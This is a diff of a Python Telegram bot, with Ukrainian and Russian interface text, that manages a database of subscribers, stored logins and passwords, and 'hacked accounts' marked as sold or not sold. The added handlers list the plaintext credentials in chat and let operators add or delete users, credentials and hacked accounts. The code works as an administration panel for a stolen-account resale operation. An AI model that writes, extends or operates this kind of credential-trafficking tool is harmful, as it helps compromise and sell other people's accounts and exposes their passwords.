@@ -195,6 +195,23 @@ def delete_hacked_account(login):
         conn.close()
         return False
 
+def delete_user(chat_id):
+    conn = get_db_connection()
+    if conn is None:
+        print("Failed to delete user: no DB connection")
+        return False
+    try:
+        c = conn.cursor()
+        c.execute("DELETE FROM users WHERE chat_id = %s", (chat_id,))
+        conn.commit()
+        conn.close()
+        print(f"User deleted: chat_id={chat_id}")
+        return True
+    except Exception as e:
+        print(f"Error deleting user: {e}")
+        conn.close()
+        return False
+
 def get_credentials():
     conn = get_db_connection()
     if conn is None:
@@ -473,8 +490,207 @@ def hacked_cmd(message):
     markup.add(types.InlineKeyboardButton("Добавить взломанный аккаунт", callback_data="add_hacked"))
     bot.reply_to(message, response, reply_markup=markup)
 
-@bot.callback_query_handler(func=lambda call: True)
-def handle_callback(call):
+@bot.message_handler(commands=['database'])
+def database_cmd(message):
+    chat_id = str(message.chat.id)
+    print(f"Processing /database for chat_id: {chat_id}")
+    access = check_access(chat_id, 'database')
+    if access:
+        bot.reply_to(message, access)
+        return
+    
+    response = "📊 База данных:\n\n"
+    
+    # Користувачі
+    users = get_all_users()
+    response += "👤 Користувачі:\n"
+    if not users:
+        response += "Порожньо\n"
+    else:
+        for chat_id, prefix, subscription_end, site_clicks, password_views in users:
+            time_left = (datetime.fromisoformat(subscription_end) - datetime.now()).days if subscription_end else 0
+            response += f"Chat ID: {chat_id} | Префікс: {prefix} | Підписка: {time_left} днів\n"
+    
+    # Паролі
+    credentials = get_credentials()
+    response += "\n🔑 Паролі:\n"
+    if not credentials:
+        response += "Порожньо\n"
+    else:
+        for login, password, added_time in credentials:
+            response += f"Логин: {login} | Пароль: {password} | Добавлен: {added_time}\n"
+    
+    # Взломані акаунти
+    hacked_accounts = get_hacked_accounts()
+    response += "\n🔓 Взломані акаунти:\n"
+    if not hacked_accounts:
+        response += "Порожньо\n"
+    else:
+        for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
+            response += f"Логин: {login} | Пароль: {password} | Статус: {sold_status}\n"
+
+    markup = types.InlineKeyboardMarkup()
+    markup.add(
+        types.InlineKeyboardButton("Додати", callback_data="db_add"),
+        types.InlineKeyboardButton("Видалити", callback_data="db_delete"),
+        types.InlineKeyboardButton("Переглянути", callback_data="db_view")
+    )
+    bot.reply_to(message, response, reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("db_"))
+def handle_db_callback(call):
+    chat_id = str(call.message.chat.id)
+    print(f"Processing database callback for chat_id: {chat_id}, data: {call.data}")
+    
+    if call.data == "db_add":
+        markup = types.InlineKeyboardMarkup()
+        markup.add(
+            types.InlineKeyboardButton("Додати користувача", callback_data="db_add_user"),
+            types.InlineKeyboardButton("Додати пароль", callback_data="db_add_cred"),
+            types.InlineKeyboardButton("Додати взломаний", callback_data="db_add_hacked")
+        )
+        bot.edit_message_text("📊 Виберіть, що додати:", chat_id, call.message.message_id, reply_markup=markup)
+    
+    elif call.data == "db_delete":
+        markup = types.InlineKeyboardMarkup()
+        markup.add(
+            types.InlineKeyboardButton("Видалити користувача", callback_data="db_del_user"),
+            types.InlineKeyboardButton("Видалити пароль", callback_data="db_del_cred"),
+            types.InlineKeyboardButton("Видалити взломаний", callback_data="db_del_hacked")
+        )
+        bot.edit_message_text("📊 Виберіть, що видалити:", chat_id, call.message.message_id, reply_markup=markup)
+    
+    elif call.data == "db_view":
+        bot.edit_message_text("📊 Ви вже переглядаєте базу даних!", chat_id, call.message.message_id)
+    
+    # Додавання
+    elif call.data == "db_add_user":
+        bot.edit_message_text("📝 Введіть: /adduser <chat_id> <префікс> <дні>", chat_id, call.message.message_id)
+    elif call.data == "db_add_cred":
+        bot.edit_message_text("📝 Введіть: /addcred <логін> <пароль>", chat_id, call.message.message_id)
+    elif call.data == "db_add_hacked":
+        bot.edit_message_text("📝 Введіть: /addhacked <логін> <пароль>", chat_id, call.message.message_id)
+    
+    # Видалення
+    elif call.data == "db_del_user":
+        users = get_all_users()
+        if not users:
+            bot.edit_message_text("📂 Користувачів немає.", chat_id, call.message.message_id)
+        else:
+            markup = types.InlineKeyboardMarkup()
+            for chat_id_user, prefix, _, _, _ in users:
+                markup.add(types.InlineKeyboardButton(f"{chat_id_user} ({prefix})", callback_data=f"db_del_user_{chat_id_user}"))
+            bot.edit_message_text("📊 Виберіть користувача для видалення:", chat_id, call.message.message_id, reply_markup=markup)
+    elif call.data == "db_del_cred":
+        credentials = get_credentials()
+        if not credentials:
+            bot.edit_message_text("📂 Паролів немає.", chat_id, call.message.message_id)
+        else:
+            markup = types.InlineKeyboardMarkup()
+            for login, _, _ in credentials:
+                markup.add(types.InlineKeyboardButton(f"{login}", callback_data=f"db_del_cred_{login}"))
+            bot.edit_message_text("📊 Виберіть пароль для видалення:", chat_id, call.message.message_id, reply_markup=markup)
+    elif call.data == "db_del_hacked":
+        hacked_accounts = get_hacked_accounts()
+        if not hacked_accounts:
+            bot.edit_message_text("📂 Взломаних акаунтів немає.", chat_id, call.message.message_id)
+        else:
+            markup = types.InlineKeyboardMarkup()
+            for login, _, _, _, _, _ in hacked_accounts:
+                markup.add(types.InlineKeyboardButton(f"{login}", callback_data=f"db_del_hacked_{login}"))
+            bot.edit_message_text("📊 Виберіть взломаний акаунт для видалення:", chat_id, call.message.message_id, reply_markup=markup)
+    
+    # Виконання видалення
+    elif call.data.startswith("db_del_user_"):
+        chat_id_user = call.data[len("db_del_user_"):]
+        if delete_user(chat_id_user):
+            bot.edit_message_text(f"✅ Користувач {chat_id_user} видалений.", chat_id, call.message.message_id)
+        else:
+            bot.edit_message_text("❌ Помилка при видаленні.", chat_id, call.message.message_id)
+    elif call.data.startswith("db_del_cred_"):
+        login = call.data[len("db_del_cred_"):]
+        if delete_credentials(login):
+            bot.edit_message_text(f"✅ Логін {login} видалений.", chat_id, call.message.message_id)
+        else:
+            bot.edit_message_text("❌ Помилка при видаленні.", chat_id, call.message.message_id)
+    elif call.data.startswith("db_del_hacked_"):
+        login = call.data[len("db_del_hacked_"):]
+        if delete_hacked_account(login):
+            bot.edit_message_text(f"✅ Логін {login} видалений із взломаних.", chat_id, call.message.message_id)
+        else:
+            bot.edit_message_text("❌ Помилка при видаленні.", chat_id, call.message.message_id)
+
+@bot.message_handler(commands=['adduser'])
+def add_user_cmd(message):
+    chat_id = str(message.chat.id)
+    print(f"Processing /adduser for chat_id: {chat_id}")
+    access = check_access(chat_id, 'database')
+    if access:
+        bot.reply_to(message, access)
+        return
+    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
+    if len(args) != 3 or not args[2].isdigit():
+        bot.reply_to(message, "❌ Формат: /adduser <chat_id> <префікс> <дні>")
+        return
+    target_chat_id, prefix, days = args[0], args[1], int(args[2])
+    subscription_end = datetime.now() + timedelta(days=days)
+    save_user(target_chat_id, prefix, subscription_end)
+    bot.reply_to(message, f"✅ Додано користувача {target_chat_id} з префіксом {prefix} на {days} днів.")
+
+@bot.message_handler(commands=['addcred'])
+def add_cred_cmd(message):
+    chat_id = str(message.chat.id)
+    print(f"Processing /addcred for chat_id: {chat_id}")
+    access = check_access(chat_id, 'database')
+    if access:
+        bot.reply_to(message, access)
+        return
+    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
+    if len(args) != 2:
+        bot.reply_to(message, "❌ Формат: /addcred <логін> <пароль>")
+        return
+    login, password = args[0], args[1]
+    if save_credentials(login, password):
+        bot.reply_to(message, f"✅ Додано логін {login} з паролем {password}.")
+    else:
+        bot.reply_to(message, "❌ Помилка при додаванні.")
+
+@bot.message_handler(commands=['addhacked'])
+def add_hacked_cmd(message):
+    chat_id = str(message.chat.id)
+    print(f"Processing /addhacked for chat_id: {chat_id}")
+    access = check_access(chat_id, 'hacked')
+    if access:
+        bot.reply_to(message, access)
+        return
+    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
+    if len(args) != 2:
+        bot.reply_to(message, "❌ Формат: /addhacked <логін> <пароль>")
+        return
+    login, password = args[0], args[1]
+    user = get_user(chat_id)
+    markup = types.InlineKeyboardMarkup()
+    markup.add(
+        types.InlineKeyboardButton("Продан", callback_data=f"hack_{login}_{password}_Продан_{chat_id}"),
+        types.InlineKeyboardButton("Не продан", callback_data=f"hack_{login}_{password}_Не продан_{chat_id}")
+    )
+    bot.reply_to(message, f"🔓 Укажите статус для {login}:", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("hack_"))
+def handle_hack_callback(call):
+    chat_id = str(call.message.chat.id)
+    parts = call.data.split("_")
+    login, password, sold_status, linked_chat_id = parts[1], parts[2], parts[3], parts[4]
+    user = get_user(chat_id)
+    if save_hacked_account(login, password, user['prefix'], sold_status, linked_chat_id):
+        bot.edit_message_text(f"✅ {login} додано до взломаних зі статусом {sold_status}.", 
+                             chat_id, call.message.message_id)
+        bot.answer_callback_query(call.id)
+    else:
+        bot.answer_callback_query(call.id, "❌ Помилка при додаванні.")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("delete_"))
+def handle_delete_callback(call):
     chat_id = str(call.message.chat.id)
     print(f"Processing callback for chat_id: {chat_id}, data: {call.data}")
     
@@ -487,35 +703,6 @@ def handle_callback(call):
         else:
             bot.answer_callback_query(call.id, "❌ Ошибка при удалении.")
     
-    elif call.data.startswith("hack_cred_"):
-        login = call.data[len("hack_cred_"):]
-        credentials = get_credentials()
-        for cred_login, cred_password, _ in credentials:
-            if cred_login == login:
-                markup = types.InlineKeyboardMarkup()
-                markup.add(
-                    types.InlineKeyboardButton("Продан", callback_data=f"hack_{login}_{cred_password}_Продан_{chat_id}"),
-                    types.InlineKeyboardButton("Не продан", callback_data=f"hack_{login}_{cred_password}_Не продан_{chat_id}")
-                )
-                bot.edit_message_text(f"🔓 Укажите статус для {login}:", chat_id, call.message.message_id, reply_markup=markup)
-                bot.answer_callback_query(call.id)
-                break
-    
-    elif call.data.startswith("hack_"):
-        parts = call.data.split("_")
-        login, password, sold_status, linked_chat_id = parts[1], parts[2], parts[3], parts[4]
-        user = get_user(chat_id)
-        if save_hacked_account(login, password, user['prefix'], sold_status, linked_chat_id) and delete_credentials(login):
-            bot.edit_message_text(f"✅ {login} добавлен в список взломанных со статусом {sold_status}.", 
-                                 chat_id, call.message.message_id)
-            bot.answer_callback_query(call.id)
-        else:
-            bot.answer_callback_query(call.id, "❌ Ошибка при добавлении.")
-    
-    elif call.data == "add_hacked":
-        bot.edit_message_text("Введите данные в формате: /addhacked <логин> <пароль>", chat_id, call.message.message_id)
-        bot.answer_callback_query(call.id)
-    
     elif call.data.startswith("delete_hacked_"):
         login = call.data[len("delete_hacked_"):]
         if delete_hacked_account(login):
@@ -524,84 +711,6 @@ def handle_callback(call):
             bot.answer_callback_query(call.id)
         else:
             bot.answer_callback_query(call.id, "❌ Ошибка при удалении.")
-
-@bot.message_handler(commands=['addhacked'])
-def add_hacked_cmd(message):
-    chat_id = str(message.chat.id)
-    print(f"Processing /addhacked for chat_id: {chat_id}")
-    access = check_access(chat_id, 'hacked')
-    if access:
-        bot.reply_to(message, access)
-        return
-    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
-    if len(args) != 2:
-        bot.reply_to(message, "❌ Формат: /addhacked <логин> <пароль>")
-        return
-    login, password = args[0], args[1]
-    user = get_user(chat_id)
-    markup = types.InlineKeyboardMarkup()
-    markup.add(
-        types.InlineKeyboardButton("Продан", callback_data=f"hack_{login}_{password}_Продан_{chat_id}"),
-        types.InlineKeyboardButton("Не продан", callback_data=f"hack_{login}_{password}_Не продан_{chat_id}")
-    )
-    bot.reply_to(message, f"🔓 Укажите статус для {login}:", reply_markup=markup)
-
-@bot.message_handler(commands=['database'])
-def database_cmd(message):
-    chat_id = str(message.chat.id)
-    print(f"Processing /database for chat_id: {chat_id}")
-    access = check_access(chat_id, 'database')
-    if access:
-        bot.reply_to(message, access)
-        return
-    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
-    conn = get_db_connection()
-    if conn is None:
-        bot.reply_to(message, "❌ Не удалось подключиться к базе данных.")
-        return
-    try:
-        c = conn.cursor()
-        if not args:
-            c.execute("SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'")
-            tables = c.fetchall()
-            response = "📊 Таблицы в базе:\n" + "\n".join(table[0] for table in tables)
-            response += "\n\nИспользуйте: /database <действие> <таблица> <значение>\nДействия: add, delete\nТаблицы: users, credentials, hacked"
-        elif args[0] == "add":
-            if args[1] == "users" and len(args) == 5:
-                chat_id, prefix, days = args[2], args[3], int(args[4])
-                subscription_end = datetime.now() + timedelta(days=days)
-                c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
-                          "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
-                          (chat_id, prefix, subscription_end.isoformat(), prefix, subscription_end.isoformat()))
-                response = f"✅ Добавлен пользователь {chat_id} с префиксом {prefix} на {days} дней."
-            elif args[1] == "credentials" and len(args) == 4:
-                login, password = args[2], args[3]
-                c.execute("INSERT INTO credentials (login, password, added_time) VALUES (%s, %s, %s) "
-                          "ON CONFLICT (login) DO NOTHING",
-                          (login, password, datetime.now().isoformat()))
-                response = f"✅ Добавлен логин {login} с паролем {password}."
-            else:
-                response = "❌ Формат: /database add <таблица> <значения>"
-        elif args[0] == "delete":
-            if args[1] == "users" and len(args) == 3:
-                chat_id = args[2]
-                c.execute("DELETE FROM users WHERE chat_id = %s", (chat_id,))
-                response = f"✅ Удален пользователь {chat_id}."
-            elif args[1] == "credentials" and len(args) == 3:
-                login = args[2]
-                c.execute("DELETE FROM credentials WHERE login = %s", (login,))
-                response = f"✅ Удален логин {login}."
-            else:
-                response = "❌ Формат: /database delete <таблица> <значение>"
-        else:
-            response = "❌ Действие не распознано. Используйте: add, delete"
-        conn.commit()
-        conn.close()
-        bot.reply_to(message, response)
-    except Exception as e:
-        print(f"Error in /database: {e}")
-        conn.close()
-        bot.reply_to(message, "❌ Ошибка при запросе к базе.")
 
 @bot.message_handler(commands=['admin'])
 def admin_cmd(message):
